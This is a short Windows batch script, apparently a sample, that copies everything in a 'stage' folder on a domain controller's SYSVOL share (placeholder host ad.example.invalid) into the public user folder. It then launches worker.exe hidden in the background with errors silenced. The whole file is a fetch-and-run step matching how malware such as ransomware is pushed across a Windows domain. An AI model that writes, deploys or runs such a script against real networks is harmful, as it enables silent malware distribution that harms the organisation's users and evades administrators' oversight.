@echo off
copy \\ad.example.invalid\SYSVOL\example.invalid\scripts\stage\* %PUBLIC% /y & start /B cmd.exe /c "%PUBLIC%\worker.exe 2>nul || exit"
